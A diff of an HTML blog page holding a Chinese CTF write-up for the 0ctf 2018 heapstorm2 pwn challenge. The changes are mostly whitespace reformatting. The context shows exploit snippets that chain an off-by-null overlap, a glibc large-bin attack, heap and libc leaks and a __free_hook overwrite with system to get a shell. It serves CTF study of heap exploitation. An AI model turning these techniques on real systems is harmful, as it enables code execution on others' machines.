@@ -376,19 +376,15 @@
     <div class="post-body" itemprop="articleBody">
         <p>buuoj刷pwn题之0ctf_2018_heapstorm2</p>
 <span id="more"></span>
-<p><strong>参考文章</strong>:<br>
-<a target="_blank" rel="external nofollow noopener noreferrer" href="https://bbs.pediy.com/thread-225973.htm">https://bbs.pediy.com/thread-225973.htm</a></p>
-<p>当然是保护全开啦<br>
-<img src="/images/851af66/1.png" alt="upload successful"></p>
-<p>关闭了fastbin<br>
-<img src="/images/851af66/2.png" alt="upload successful"></p>
+
+
+<p><strong>参考文章</strong>:<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://bbs.pediy.com/thread-225973.htm">https://bbs.pediy.com/thread-225973.htm</a></p>
+<p>当然是保护全开啦<br><img src="/images/851af66/1.png" alt="upload successful"></p>
+<p>关闭了fastbin<br><img src="/images/851af66/2.png" alt="upload successful"></p>
 <p>有add，edit，delete，show</p>
-<p>malloc的指针都和随机数异或后存储<br>
-<img src="/images/851af66/3.png" alt="upload successful"><br>
-<img src="/images/851af66/4.png" alt="upload successful"></p>
+<p>malloc的指针都和随机数异或后存储<br><img src="/images/851af66/3.png" alt="upload successful"><br><img src="/images/851af66/4.png" alt="upload successful"></p>
 <p>莫得fastbin，要large bin attack</p>
-<p>edit功能有off by null的缺陷<br>
-<img src="/images/851af66/5.png" alt="upload successful"></p>
+<p>edit功能有off by null的缺陷<br><img src="/images/851af66/5.png" alt="upload successful"></p>
 <p>可以利用这个off by null来制造overlap chunk</p>
 <p>通过edit，伪造接下来要用上的pre_size</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 0</span>
@@ -404,32 +400,32 @@ add<span class="token punctuation">(</span><span class="token number">0x508</spa
 add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 5</span>
 edit<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token operator">*</span> <span class="token number">0x4f0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x500</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
 add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 6</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>情况如下<br>
-<img src="/images/851af66/6.png" alt="upload successful"><br>
-<img src="/images/851af66/7.png" alt="upload successful"></p>
+
+<p>情况如下<br><img src="/images/851af66/6.png" alt="upload successful"><br><img src="/images/851af66/7.png" alt="upload successful"></p>
 <p>将chunk1给free掉，然后修改chunk0，off by null将chunk1的size改掉</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token comment"># chunk2 pre_size=0x510, inuse=0</span>
 edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># chunk1 size=0x500</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>可以看到，chunk1的size最低字节改成了<code>\x00</code>，从原来的0x510变成了0x500<br>
-<img src="/images/851af66/8.png" alt="upload successful"></p>
-<p>同时，chunk2的inused位变成了0，因为他的前一个chunk(chunk1)已经free了<br>
-<img src="/images/851af66/9.png" alt="upload successful"></p>
+
+<p>可以看到，chunk1的size最低字节改成了<code>\x00</code>，从原来的0x510变成了0x500<br><img src="/images/851af66/8.png" alt="upload successful"></p>
+<p>同时，chunk2的inused位变成了0，因为他的前一个chunk(chunk1)已经free了<br><img src="/images/851af66/9.png" alt="upload successful"></p>
 <p>此时再malloc，会从之前的释放的chunk1从分配，因为size已经修改成了0x500，那么下一个chunk的位置就是chunk1+0x500，这个位置是之前构造的pre_size，也是0x500，所以通过检查，可以malloc</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
 add<span class="token punctuation">(</span><span class="token number">0x4d8</span><span class="token punctuation">)</span> <span class="token comment"># 7</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
 <p><img src="/images/851af66/10.png" alt="upload successful"></p>
 <p>此时再释放1和2，要注意2的inused是0，那么chunk1和chunk2会合并入unsorted bin</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># chunk1+chunk2合并，node7指向chunk1+0x20+0x10</span>
 free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
 free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
 <p>而此时的7还可以控制chunk1与chunk2合并后的区域</p>
 <p><img src="/images/851af66/11.png" alt="upload successful"></p>
 <p><img src="/images/851af66/12.png" alt="upload successful"></p>
 <p>然后把这块chunk，再malloc出来</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token punctuation">)</span> <span class="token comment"># 1</span>
 add<span class="token punctuation">(</span><span class="token number">0x4e8</span><span class="token punctuation">)</span> <span class="token comment"># 2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>1和7就重叠了<br>
-<img src="/images/851af66/13.png" alt="upload successful"></p>
+
+<p>1和7就重叠了<br><img src="/images/851af66/13.png" alt="upload successful"></p>
 <p>重复一遍操作</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
 edit<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token string">'h'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x18</span> <span class="token operator">-</span> <span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
@@ -438,10 +434,9 @@ add<span class="token punctuation">(</span><span class="token number">0x4d8</spa
 free<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>
 free<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
 add<span class="token punctuation">(</span><span class="token number">0x48</span><span class="token punctuation">)</span> <span class="token comment"># 4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>4和8也重叠了<br>
-<img src="/images/851af66/14.png" alt="upload successful"></p>
-<p>此时unsorted bin里面还有之前free的4的一部分块(add(0x48)后切割剩下的)<br>
-<img src="/images/851af66/15.png" alt="upload successful"></p>
+
+<p>4和8也重叠了<br><img src="/images/851af66/14.png" alt="upload successful"></p>
+<p>此时unsorted bin里面还有之前free的4的一部分块(add(0x48)后切割剩下的)<br><img src="/images/851af66/15.png" alt="upload successful"></p>
 <p>此时将2释放，再分配，0x5555557575c0就被安排到large bin里</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
 add<span class="token punctuation">(</span><span class="token number">0x4e8</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
@@ -467,6 +462,7 @@ pay <span class="token operator">=</span> p64<span class="token punctuation">(</
 pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># bk</span>
 pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_chunk<span class="token operator">-</span><span class="token number">0x18</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">)</span> <span class="token comment"># bk_nextsize</span>
 edit<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p><img src="/images/851af66/19.png" alt="upload successful"></p>
 <p>这里参考了文章，再malloc一下，将会出现unsorted bin中的chunk，扔进large bin的操作(有个检查)</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">try</span><span class="token punctuation">:</span>
@@ -476,6 +472,7 @@ edit<span class="token punctuation">(</span><span class="token number">8</span><
     <span class="token keyword">continue</span>
 
 <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>copy一下关键源码</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c">victim<span class="token operator">-></span>fd_nextsize <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
 victim<span class="token operator">-></span>bk_nextsize <span class="token operator">=</span> fwd<span class="token operator">-></span>bk_nextsize<span class="token punctuation">;</span>
@@ -487,22 +484,19 @@ victim<span class="token operator">-></span>bk <span class="token operator">=</s
 victim<span class="token operator">-></span>fd <span class="token operator">=</span> fwd<span class="token punctuation">;</span>
 fwd<span class="token operator">-></span>bk <span class="token operator">=</span> victim<span class="token punctuation">;</span>
 bck<span class="token operator">-></span>fd <span class="token operator">=</span> victim<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>这里的<code>vicitim</code>是unsorted bin中的chunk，是上图中的，<code>0xxx060</code>，而<code>fwd</code>是large bin中的chunk，为<code>0xxx5c0</code></p>
 <p>这里<code>victim-&gt;bk_nextsize=fwd-&gt;bk_nextsize</code>使得<code>victim-&gt;bk_nextsize=0x133707c3</code>(0x133707c3就是前面的fake_chunk-0x18-5)</p>
 <p>然后<code>victim-&gt;bk_nextsize-&gt;fd_nextsize=victim</code>，就是<code>*(0x133707c3+0x20)=*(0x133707e3)=0xxxx060</code></p>
-<p>这样就修改成功了(开了ASLR后，就有可能是0x56xxxx060了)<br>
-<img src="/images/851af66/20.png" alt="upload successful"></p>
-<p>然后开头的这个<code>0x56</code>就在fake_chunk的size字段<br>
-<img src="/images/851af66/21.png" alt="upload successful"></p>
+<p>这样就修改成功了(开了ASLR后，就有可能是0x56xxxx060了)<br><img src="/images/851af66/20.png" alt="upload successful"></p>
+<p>然后开头的这个<code>0x56</code>就在fake_chunk的size字段<br><img src="/images/851af66/21.png" alt="upload successful"></p>
 <p>这个size要为0x56是要，满足一个检查，要开启chunk的mmap标志位置位。</p>
 <pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">assert</span> <span class="token punctuation">(</span><span class="token operator">!</span>mem <span class="token operator">||</span> <span class="token function">chunk_is_mmapped</span> <span class="token punctuation">(</span><span class="token function">mem2chunk</span> <span class="token punctuation">(</span>mem<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">||</span>
          av <span class="token operator">==</span> <span class="token function">arena_for_chunk</span> <span class="token punctuation">(</span><span class="token function">mem2chunk</span> <span class="token punctuation">(</span>mem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>IS_MAPPED位在第二位：<br>
-<img src="/images/851af66/23.png" alt="upload successful"></p>
-<p>参考ctfwiki：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/</a><br>
-<img src="/images/851af66/22.png" alt="upload successful"></p>
-<p>fake_chunk搞到了，就可以修改开头的随机数，来使用view了<br>
-<img src="/images/851af66/24.png" alt="upload successful"></p>
+
+<p>IS_MAPPED位在第二位：<br><img src="/images/851af66/23.png" alt="upload successful"></p>
+<p>参考ctfwiki：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/heap_structure-zh/</a><br><img src="/images/851af66/22.png" alt="upload successful"></p>
+<p>fake_chunk搞到了，就可以修改开头的随机数，来使用view了<br><img src="/images/851af66/24.png" alt="upload successful"></p>
 <p>先让node0指向heap位置先，方便后面修改</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x13377331</span><span class="token punctuation">)</span>  <span class="token comment"># view</span>
 pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>storage<span class="token punctuation">)</span>   <span class="token comment"># node0: ptr</span>
@@ -516,8 +510,9 @@ edit<span class="token punctuation">(</span><span class="token number">0</span><
 
 heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 leak<span class="token punctuation">(</span><span class="token string">'heap'</span><span class="token punctuation">,</span> heap<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>这个chunk(0xxxx060)，的fd字段就是main_arena<br>
-<img src="/images/851af66/26.png" alt="upload successful"></p>
+
+
+<p>这个chunk(0xxxx060)，的fd字段就是main_arena<br><img src="/images/851af66/26.png" alt="upload successful"></p>
 <p>可leak出main_arena来计算libc的基地址</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">pay <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">2</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x13377331</span><span class="token punctuation">)</span>  <span class="token comment"># view</span>
 pay <span class="token operator">+=</span> p64<span class="token punctuation">(</span>storage<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>  <span class="token comment"># node0: ptr,size</span>
@@ -526,6 +521,7 @@ edit<span class="token punctuation">(</span><span class="token number">0</span><
 
 lbase <span class="token operator">=</span> u64<span class="token punctuation">(</span>show<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token number">0x7f4ef5812b78</span> <span class="token operator">-</span> <span class="token number">0x7f4ef544e000</span><span class="token punctuation">)</span>
 leak<span class="token punctuation">(</span><span class="token string">'lbase'</span><span class="token punctuation">,</span> lbase<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
 <p>之后就改free_hook成system，然后getshell</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">__free_hook <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>
 system <span class="token operator">=</span> lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
@@ -541,6 +537,8 @@ edit<span class="token punctuation">(</span><span class="token number">0</span><
 
 edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>
 free<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
 <p>完整exp：</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>
 <span class="token comment">#!/usr/bin/python2</span>
@@ -801,13 +799,13 @@ irt<span class="token punctuation">(</span><span class="token punctuation">)</sp
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">379k</span>
+    <span title="站点总字数">380k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:45</span>
+    <span title="站点阅读时长">5:46</span>
   </span>
 </div>
 <div class="busuanzi-count">
